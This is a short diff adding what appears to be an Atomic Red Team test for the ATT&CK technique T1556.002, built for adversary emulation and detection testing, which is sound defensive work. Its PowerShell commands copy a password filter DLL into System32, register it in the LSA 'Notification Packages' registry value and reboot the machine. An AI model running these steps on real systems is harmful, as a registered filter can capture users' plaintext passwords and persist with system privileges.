@@ -1,0 +1,17 @@
+#TechniqueName: Modify Authentication Process: Password Filter DLL
+#AtomicTestName: Install and Register Password Filter DLL
+#Description: Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You must provide your own password filter dll"
+
+
+#commands
+$passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
+$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
+$notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
+$notificationPackagesValues += $passwordFilterName
+Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
+Restart-Computer -Confirm
+
